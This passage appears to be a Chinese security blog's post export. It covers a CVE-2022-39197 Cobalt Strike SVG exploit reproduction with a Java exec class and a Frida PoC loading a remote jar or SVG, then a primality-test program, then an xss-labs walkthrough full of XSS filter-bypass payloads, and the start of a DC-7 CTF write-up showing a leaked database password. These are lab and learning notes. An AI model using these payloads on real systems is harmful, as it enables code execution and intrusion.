是用于二维图形的基于XML的矢量图像格式，并支持交互性和动画</p><p>svg文件示例：</p><pre><code class="html">&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;&lt;/svg&gt;</code></pre><h3 id="SVG-XSS"><a href="#SVG-XSS" class="headerlink" title="SVG XSS"></a>SVG XSS</h3><p>SVG文件还支持嵌入式javascript代码,利用这点，可以构造xss payload</p><pre><code class="html">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;  &lt;script type=&quot;text/javascript&quot;&gt;    alert(&quot;1&quot;);  &lt;/script&gt;&lt;/svg&gt;</code></pre><p>注意： 上传时，注意内容类型设置为：<code>Content-Type: image/svg+xml</code></p><h3 id="SVG-XXE"><a href="#SVG-XXE" class="headerlink" title="SVG XXE"></a>SVG XXE</h3><p>前面说了 SVG 是基于 XML 的矢量图，因此可以支持 Entity (实体) 功能，因此可以用来 XXE,具体利用参考<a href="https://my.oschina.net/hetianlab/blog/4723160">https://my.oschina.net/hetianlab/blog/4723160</a></p><h3 id="SVG执行java代码"><a href="#SVG执行java代码" class="headerlink" title="SVG执行java代码"></a>SVG执行java代码</h3><p>首先写个命令执行的而已java代码</p><pre><code class="java">import org.w3c.dom.events.Event;import org.w3c.dom.events.EventListener;import org.w3c.dom.svg.EventListenerInitializer;import org.w3c.dom.svg.SVGDocument;import org.w3c.dom.svg.SVGSVGElement;import java.util.*;import java.io.*;public class Exploit implements EventListenerInitializer &#123;    public Exploit() &#123;    &#125;    public void initializeEventListeners(SVGDocument document) &#123;        SVGSVGElement root = document.getRootElement();        EventListener listener = new EventListener() &#123;            public void handleEvent(Event event) &#123;                try &#123;                    Process p = Runtime.getRuntime().exec(&quot;calc&quot;);                &#125; catch (Exception e) &#123;&#125;            &#125;        &#125;;        root.addEventListener(&quot;SVGLoad&quot;, listener, false);    &#125;&#125;</code></pre><p>MANIFEST.MF文件</p><pre><code>Manifest-Version: 1.0SVG-Handler-Class: Exploit</code></pre><p>然后将恶意java代码打包成jar文件</p><p>下一步就是准备SVG文件，</p><pre><code class="html">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.0&quot;&gt;    &lt;script type=&quot;application/java-archive&quot; xlink:href=&quot;http://xxx.xxx.xxx.xxx/EvilJar-1.0-jar-with-dependencies.jar&quot;/&gt;    &lt;text&gt;CVE-2022-39197&lt;/text&gt;&lt;/svg&gt;</code></pre><p>注意：SVG的默认安全策略是在 JAR 与 SVG 文件具有相同来源时才会执行 Java 代码</p><h2 id="RCE复现"><a href="#RCE复现" class="headerlink" title="RCE复现"></a>RCE复现</h2><p>经过上面的折腾，得到最终的payload:</p><pre><code class="html">&lt;html&gt;&lt;object classid=&#39;org.apache.batik.swing.JSVGCanvas&#39;&gt;&lt;param name=&#39;URI&#39; value=&#39;payload&#39;&gt;&lt;/param&gt;&lt;/object&gt;</code></pre><p>网上找到的POC</p><pre><code class="python">import fridaimport timeimport sysdef processInject(target, url):    print(&#39;[+] Spawning target process&#39;)    pid = frida.spawn(target)    session = frida.attach(pid)    frida_script = &#39;&#39;&#39;      var payload=&quot;&lt;html&gt;&lt;object classid=&#39;org.apache.batik.swing.JSVGCanvas&#39;&gt;&lt;param name=&#39;URI&#39; value=&#39;USER_PAYLOAD&#39;&gt;&lt;/param&gt;&lt;/object&gt;&quot;      var pProcess32Next = Module.findExportByName(&quot;kernel32.dll&quot;, &quot;Process32Next&quot;)    Interceptor.attach(pProcess32Next, &#123;        onEnter: function(args) &#123;            this.pPROCESSENTRY32 = args[1];            if(Process.arch == &quot;ia32&quot;)&#123;                this.exeOffset = 36;            &#125;else&#123;                this.exeOffset = 44;            &#125;            this.szExeFile = this.pPROCESSENTRY32.add(this.exeOffset);        &#125;,        onLeave: function(retval) &#123;            if(this.szExeFile.readAnsiString() == &quot;beacon.exe&quot;) &#123;                send(&quot;[!] Found beacon, injecting payload&quot;);                this.szExeFile.writeAnsiString(payload);            &#125;        &#125;    &#125;)    &#39;&#39;&#39;.replace(&quot;USER_PAYLOAD&quot;, url)    script = session.create_script(frida_script)    script.load()    frida.resume(pid)    # make sure payload is triggered on client    print(&quot;[+] Waiting for 100 seconds&quot;)    time.sleep(100)    frida.kill(pid)    print(&#39;[+] Done! Killed beacon process.&#39;)    exit(0)if __name__ == &#39;__main__&#39;:    if len(sys.argv) == 3:        processInject(sys.argv[1], sys.argv[2])    else:        print(&quot;[-] Incorrect Usage!\n\nExample: python3 &#123;&#125; beacon.exe http://10.10.10.2:8080/evil.svg&quot;.format(sys.argv[0]))</code></pre><p>将SVG文件和jar文件放到服务器上，修改SVG中的<code>xlink:href</code>为jar链接</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011229206.png" alt="image-20221101114517102"></p><p>然后用poc模拟上线,beacon.exe是木马文件</p><pre><code>python3 cve-2022-39197.py beacon.exe http://xxx.xxx.xxx.xxx/evil.svg</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011229136.png" alt="image-20221101120607766"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011229313.png" alt="image-20221101120517468"></p><p>点开进程列表，随便点点，成功弹出计算机</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011229550.png" alt="image-20221101121636153"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞号称是脚本小子杀手，蓝队快乐洞。在复现这个漏洞的过程中，很折磨，也很享受，让我学习到关于Swing和SVG的知识，也是我接触java安全的第一步，后面会继续学习java安全</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三个素性检验</title>
      <link href="/2022/03/12/%E4%B8%89%E4%B8%AA%E7%B4%A0%E6%80%A7%E6%A3%80%E9%AA%8C/"/>
      <url>/2022/03/12/%E4%B8%89%E4%B8%AA%E7%B4%A0%E6%80%A7%E6%A3%80%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="Python实现三个素性检验"><a href="#Python实现三个素性检验" class="headerlink" title="Python实现三个素性检验"></a>Python实现三个素性检验</h1><h2 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h2><p>直接运行，根据提示选择模式、输入检验的数n和循环次数k即可</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre><code class="python">import randomimport timedef QuickPower(a,n,p):#快速幂算法   tmp = a   ret =1   while(n &gt;0):       if(n&amp;1):           ret = (ret * tmp) % p       tmp = (tmp * tmp) % p       n&gt;&gt;=1   return retdef Jacobi(n,m):# calc Jacobi(n/m)   n = n%m   if n==0:       return 0   Jacobi2 =1   if not(n&amp;1):#若有n为偶数,计算Jacobi2 = Jacobi(2/m)^(s)其中n = 2^s*t t为奇数       k = (-1)**(((m**2-1)//8)&amp;1)       while not(n&amp;1):           Jacobi2 *= k           n &gt;&gt;=1   if n==1:       return Jacobi2   return Jacobi2 * (-1)**(((m-1)//2*(n-1)//2)&amp;1) * Jacobi(m%n,n)def Exgcd(r0,r1):# calc ax+by = gcd(a, b) return x   x0,y0 =1,0   x1,y1 =0,1   x,y = r0,r1   r = r0 % r1   q = r0 // r1   while r:       x,y = x0 - q * x1,y0 - q * y1       x0,y0 = x1,y1       x1,y1 = x,y       r0 = r1       r1 = r       r = r0 % r1       q = r0 // r1   return xdef Fermat(x,T):# Fermat素性判定       if x &lt;2:               return False       if x&lt;=3:               return True       if x%2==0 or x%3==0:               return False       for i in range(T):               ran = random.randint(2,x-2)#随机取[2, x-2]的一个整数               if QuickPower(ran,x-1,x) !=1:                       return False       return Truedef Solovay_Stassen(x,T):# Solovay_Stassen素性判定   if x &lt;2:       return False   if x &lt;=3:       return True   if x%2==0 or x%3==0:       return False   for i in range(T):#随机选择T个整数       ran = random.randint(2,x-2)       r = QuickPower(ran,(x-1)//2,x)       if r !=1 and r != x-1:           return False       if r == x-1:           r = -1       if r != Jacobi(ran,x):           return False   return Truedef MillerRabin(x,ran):# x-1 = 2^s*t   tx = x-1   s2 = tx&amp;(~tx+1)#取出最后一位以1开头的二进制 即2^s   r = QuickPower(ran,tx//s2,x)   if r ==1 or r == tx:       return True   while s2&gt;1:#从2^s -&gt; 2^1循环s次       r = (r*r)%x       if r ==1:           return False       if r == tx:           return True       s2 &gt;&gt;=1   return Falsedef MillerRabin_init(x,T):#Miller-Rabin素性判定   if x &lt;2:       return False   if x &lt;=3:       return True   if x%2==0 or x%3==0:       return False   for i in range(T):#随机选择T个整数       ran = random.randint(2,x-2)       if not MillerRabin(x,ran):           return False   return Truedef CRT(b,m,n):# calc x = b[] % m[]   M =1   for i in range(n):       M *= m[i]   ans =0   for i in range(n):       ans += b[i] * M // m[i] * Exgcd(M//m[i],m[i])   return ans%Mif __name__ == &quot;__main__&quot;:    print(&#39;1 ：费马素性检验\n2 : Solovay_Stassen素性检验\n3 : 米勒.拉宾素性检验\n4 : 三个素性检验一起进行\n&#39;)    cho=input(&#39;选择运行模式：&#39;)    if cho!=&#39;1&#39;and cho!=&#39;2&#39;and cho!=&#39;3&#39;and cho!=&#39;4&#39; :        print(&#39;输入错误！！&#39;)        exit()       n = int(input(&quot;请输入需要检测的整数n：&quot;))    k = int(input(&quot;请输入循环次数k：&quot;))    print(&#39;*&#39;*100)    if cho==&#39;1&#39;:        a=Fermat(n,k)        print(&#39;费马素性检验结果：&#39;,a)    elif cho==&#39;2&#39;:        b=Solovay_Stassen(n,k)        print(&#39;Solovay_Stassen素性检验结果：&#39;,b)    elif cho==&#39;3&#39;:        c=MillerRabin_init(n,k)        print(&#39;米勒.拉宾素性检验结果：&#39;,c)    elif cho==&#39;4&#39;:        start = time.perf_counter()        a=Fermat(n,k)        end = time.perf_counter()        print(&#39;费马素性检验结果：&#39;,a)        print(&quot;费马素性检验运行耗时&quot;,end-start)        print(&#39;\n&#39;)        start = time.perf_counter()        b=Solovay_Stassen(n,k)        end = time.perf_counter()        print(&#39;Solovay_Stassen素性检验结果：&#39;,b)        print(&quot;Solovay_Stassen素性检验运行耗时&quot;,end-start)        print(&#39;\n&#39;)        start = time.perf_counter()        c=MillerRabin_init(n,k)        end = time.perf_counter()        print(&#39;米勒.拉宾素性检验结果：&#39;,c)        print(&quot;米勒.拉宾素性检验运行耗时&quot;,end-start)    </code></pre><h2 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220312230127542.png" alt="image-20220312230127542"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220312230225020.png" alt="image-20220312230225020"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 信安数学基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs靶场练习</title>
      <link href="/2022/02/17/xss-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2022/02/17/xss-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="xss-labs靶场练习"><a href="#xss-labs靶场练习" class="headerlink" title="xss-labs靶场练习"></a>xss-labs靶场练习</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><img src="https://raw.githubusercontent.com/todis21/image/main/img/1645071060231.png" alt="1645071060231" style="zoom: 50%;" /><p>观察url的构造，这里是向服务器提交了个名为<code>name</code>的参数,值为<code>text</code>，并且值和值的长度都在页面有回显。</p><p>查看网页源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/QQ%E6%88%AA%E5%9B%BE20220217142356.png" alt="QQ截图20220217142356"></p><p>name参数的值直接插入到了<h2></h2>标签之中。那么这样看来这一关主要就是考察反射型XSS。</p><pre><code>payload:name=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217143223741.png" alt="image-20220217143223741"></p><p>从url地址来看，依然是get方式传递参数，所以猜测考察的还是反射型XSS。只不过这一关将参数名换成了keyword。</p><p>查看页面源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217143513098.png" alt="image-20220217143513098"></p><p>这里有两个地方回显值的地方，利用第一关的payload试试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217143809347.png" alt="image-20220217143809347"></p><p>观察源码，第一处回显处的特殊字符被编码了，不能利用，第二处的回显处可以完整的回显值，可以利用这里构造payload,</p><p>这里需要构造闭合</p><pre><code>&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>url构造同上一关</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217144449415.png" alt="image-20220217144449415"></p><p>页面源码和上一关的差不多，只是双引号变成单引号</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217144758278.png" alt="image-20220217144758278"></p><p>尝试构造payload：</p><pre><code>&#39;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p>发现并没有弹窗，继续观察源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217145017841.png" alt="image-20220217145017841"></p><p>发现这关的&lt;,&gt;被编码成了html实体。经过查看php文件，在这两处都用htmlspecialchars()函数进行了处理。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217145359528.png" alt="image-20220217145359528"></p><p>所以这里不能用含有&lt;&gt;的payload</p><p>这里可以通过<code>&lt;input&gt;</code>标签的一些特殊事件来执行js代码:</p><pre><code>&#39; onmouseover=javascript:alert(1) &#39;</code></pre><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217150532899.png" alt="image-20220217150532899"></p><p>查看源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217150738232.png" alt="image-20220217150738232"></p><p>这一关只是把上一关的单引号变成了双引号,payload构造如下</p><pre><code>&quot; onmouseover=javascript:alert(1) &quot;</code></pre><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217151227524.png" alt="ccc"></p><p>查看页面源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217153208676.png" alt="image-20220217153208676"></p><p>这和上一关的源码差不多，直接用上一关的payload，无法弹窗</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217153541015.png" alt="image-20220217153541015"></p><p>发现<code>onmouseover</code>变成了<code>o_nmouseover</code>,经过测试<code>&lt;script&gt;</code>和<code>onclick</code>也被_分隔了</p><p>这里不用<code>&lt;input&gt;</code>标签了，把它闭合掉,用a标签试试</p><pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;link&lt;/a&gt; &lt;&quot;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217154340891.png" alt="image-20220217154340891"></p><p>点击link弹窗。进入下一关</p><h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217155856005.png" alt="image-20220217155856005"></p><p>源码和上一关差不多</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217160010837.png" alt="image-20220217160010837"></p><p>尝试使用上一关的payload,并没有出现弹窗</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217160114004.png" alt="image-20220217160114004"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217160153498.png" alt="image-20220217160153498"></p><p>发现这里的<code>href</code>也被<code>_</code>分隔了</p><p>因为html对大小写不敏感，即不区分大小写，这里可以试试下面的payload</p><pre><code>&quot;&gt;&lt;a Href=&quot;javascript:alert(111)&quot;&gt;link&lt;/a&gt; &lt;&quot;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217161822841.png" alt="image-20220217161822841"></p><p>点击link弹窗。进入下一关</p><h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217210116917.png" alt="image-20220217210116917"></p><p>页面源码与上一关的雷同，用上一关的payload：<code>&quot;&gt;&lt;a Href=&quot;javascript:alert(1)&quot;&gt;link&lt;/a&gt; &lt;&quot;</code>试试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217210446573.png" alt="image-20220217210446573"></p><p>发现这里过滤了<code>script</code>和<code>href</code>,可以用双写绕过，即在script里面再插入一个script,如<code>scrscriptipt</code>,</p><p>当script被过滤后，剩下的拼接起来刚好能组合成script,href也同理</p><p>payload</p><pre><code>&quot;&gt;&lt;a hRhrefef=&quot;javascriscriptpt:alert(&#39;111&#39;)&quot;&gt;link&lt;/a&gt;&lt;&quot;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217211132648.png" alt="image-20220217211132648"></p><p>点击link弹窗。进入下一关</p><h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217211535003.png" alt="image-20220217211535003"></p><p>这关多了一个“友情链接”，按照套路，这里应该是利用点</p><p>首先先查看页面源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217212026427.png" alt="image-20220217212026427"></p><p>回显值的地方有两个，用上一关的payload试试水</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217212158383.png" alt="image-20220217212158383"></p><p>可以发现，第一个回显处被htmlspecialchars()函数进行了处理，第二个回显处href和script都被<code>_</code>分隔了</p><p>可以对第二处进行构造payload</p><pre><code>javascript:alert(1)</code></pre><p>这里的scrpit会被分隔，所以将它进行unicode编码</p><pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217213124300.png" alt="image-20220217213124300"></p><p>点击<code>友情链接</code>即可弹窗</p><h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217214219071.png" alt="image-20220217214219071"></p><p>查看源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217214603403.png" alt="image-20220217214603403"></p><p>这里显示链接不合法，经过测试，提交的内容里只要含有<code>http://</code>就合法,https:&#x2F;&#x2F;不行</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217215516760.png" alt="image-20220217215516760"></p><p>尝试payload ： javascript:alert(http:&#x2F;&#x2F;)</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217215653634.png" alt="image-20220217215653634"></p><p>发现script被分隔了，可以将script进行unicode编码绕过</p><pre><code>java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(&#39;http://&#39;)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217220749312.png" alt="image-20220217220749312"></p><p>点击<code>友情链接</code>即可弹窗</p><h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217222013957.png" alt="image-20220217222013957"></p><p>传递keyword值为<code>&lt;script&gt;alert(111)&lt;/script&gt;</code>进行测试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217222505101.png" alt="image-20220217222505101"></p><p>可以看到回显值的地方被htmlspecialchars()函数进行了处理，还有三个隐藏的输入框，尝试向它们传值</p><pre><code>?keyword=1111&amp;t_link=222&amp;t_history=333&amp;t_sort=444</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217223126794.png" alt="image-20220217223126794"></p><p>发现t_sort有回显，在这里构造payload</p><pre><code>t_sort=&quot; onmouseover=javascript:alert(1) &quot; type=&quot;text</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217223555926.png" alt="image-20220217223555926"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220217223608521.png" alt="image-20220217223608521"></p><h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218080510169.png" alt="image-20220218080510169"></p><p>这关的页面源码和上一关的雷同，多了个隐藏的输入框<code>t_ref</code>,value值为上一关的url</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218081735399.png" alt="image-20220218081735399"></p><p>这里可以猜测，这个参数的值，是来源于请求头Referer,通过referer来传入payload</p><pre><code>&quot; onmouseover=javascript:alert(1) &quot; type=&quot;text</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218082110453.png" alt="image-20220218082110453"></p><p>可以弹窗进入下一关</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218082133492.png" alt="image-20220218082133492"></p><h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218082535475.png" alt="image-20220218082535475"></p><p>这一关又多了个隐藏的输入框<code>t_ua</code>,看它的值可以知道它的值来源于User-Agent</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218082846721.png" alt="image-20220218082846721"></p><p>通过User-Agent传入上一关的payload即可弹窗</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218083019729.png" alt="image-20220218083019729"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218083052475.png" alt="image-20220218083052475"></p><h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218092723595.png"></p><p>查看页面源码，发现这次的隐藏输入框是<code>t_cook</code>,它的值是来自Cookies</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218093119924.png"></p><p>同样的套路，吧上一关的payload加到cookie即可</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218093319008.png"></p><p>成功弹窗进入下一关</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218093341818.png"></p><h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h2><p>这一关是Exif xss,php的<code>exif_read_data</code>函数读出exif信息，读出的值直接未经过滤的输出，就会导致Xss的发生。</p><p>网站打不开，这关跳过</p><h2 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218113901942.png" alt="image-20220218113901942"></p><p>查看源码发现<code>angular.min.js</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218114103327.png" alt="image-20220218114103327"></p><p>URL的src参数回显在下面的ng-include</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218114236036.png" alt="image-20220218114236036"></p><p>ng-include相当于php的include函数，所以我们包含一个有XSS漏洞的URL就可触发这里的XSS。</p><p>在本地写个html文件，把地址传给src即可</p><pre><code>&lt;input type=&quot;text&quot; name=&quot;&quot; onclick=alert(&#39;xss&#39;)&gt;</code></pre><pre><code>http://localhost/xss-labs/level15.php?src=&quot;http://localhost/2.html&quot;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218114850262.png" alt="image-20220218114850262"></p><h2 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218115116596.png" alt="image-20220218115116596"></p><p>观察url构造，发现这一关是通过get一个keyword来传递参数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218115243816.png" alt="image-20220218115243816"></p><p>参数值回显在<code>&lt;center&gt;</code>标签中，使用<code>&lt;img&gt;</code>标签来弹窗</p><pre><code>&lt;img src=&#39;&#39; onerror=alert(111)&gt;</code></pre><pre><code>http://localhost/xss-labs/level16.php?keyword=&lt;img src=&#39;&#39; onerror=alert(111)&gt;</code></pre><p>传值后没有弹窗，观察页面源码得知，空格被转义了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218115733037.png" alt="image-20220218115733037"></p><p>空格可以用<code>%20 %09 %0a %0b %0c %0d %a0 %00</code>代替，经过测试<code>%0d</code>可以用</p><p>所以payload为</p><pre><code>http://localhost/xss-labs/level16.php?keyword=&lt;img%0dsrc=&#39;&#39;%0donerror=alert(111)&gt;</code></pre><p>弹窗成功</p><h2 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h2><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218120659720.png" alt="image-20220218120659720"></p><p>这有个flash，但是这关和它没有关系</p><p>发现url有个?arg01&#x3D;a&amp;arg02&#x3D;b，再观察一下页面源码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218121009693.png" alt="image-20220218121009693"></p><p>发现两个参数的值回显在<code>&lt;embed&gt;</code>标签中，可以通过构该标签的特殊事件进行弹窗</p><pre><code>?arg01=a%0aonmouseover&amp;arg02=alert(1)</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218122200252.png" alt="image-20220218122200252"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218122212241.png" alt="image-20220218122212241"></p><h2 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h2><p>这一关的页面源码和上一关的没什么区别，直接用上一关的payload即可</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220218122616195.png" alt="image-20220218122616195"></p><h2 id="Level-19-x2F-20"><a href="#Level-19-x2F-20" class="headerlink" title="Level 19&#x2F;20"></a>Level 19&#x2F;20</h2><p>摆烂！</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-7靶场练习</title>
      <link href="/2021/12/31/DC-7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/12/31/DC-7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-7靶场练习"><a href="#DC-7靶场练习" class="headerlink" title="DC-7靶场练习"></a>DC-7靶场练习</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali:192.168.10.128</p><p>dc-7:192.168.10.196</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机发现：</p><pre><code>netdiscover -r 192.168.10.0/24</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211231193327034.png" alt="image-20211231193327034"></p><p>端口扫描</p><pre><code>nmap -sS -sV -T4 -A -p- 192.168.10.196</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211231193607875.png" alt="image-20211231193607875"></p><p>发现靶机打开了22(ssh)和80(http)端口</p><p>打开web端<code>http://192.168.10.196/</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211231194235606.png" alt="image-20211231194235606"></p><p>这个网站使用的CMS是Drupal8</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211231194255615.png" alt="image-20211231194255615"></p><p>第一反应就是使用searchsploit和MSF来寻找利用模块，但是尝试了好几个脚本和模块都没有拿到shell</p><p>翻译一下首页的内容，获取到一点点线索，并且得到线索在框外部</p><pre><code>欢迎来到 DC-7DC-7 引入了一些“新”概念，但我会让你弄清楚它们是什么。 :-)虽然这个挑战并不是那么技术性的，但如果你需要诉诸蛮力或字典攻击，你可能不会成功。您必须做的是“跳出”框框思考。方法在“外”框。 :-)</code></pre><p>回到网页发现Drupal是被DIY过的，重点看首页的footer部分，也就是网页的最下方的黑色区域，靶机的除了”Powered by Drupal”，还多了一个”@DC7USER”。谷歌搜索”@DC7USER”</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104112000213.png" alt="image-20220104112000213"></p><p>这是他的项目，可以在github上查看源码，找到配置文件<code>config.php</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20220104112445470.png" alt="image-20220104112445470"></p><pre><code>&lt;?php    $servername = &quot;localhost&quot;;    $username = &quot;dc7user&quot;;    $password = &quot;MdR3xOgB7#dW&quot;;    $dbname = 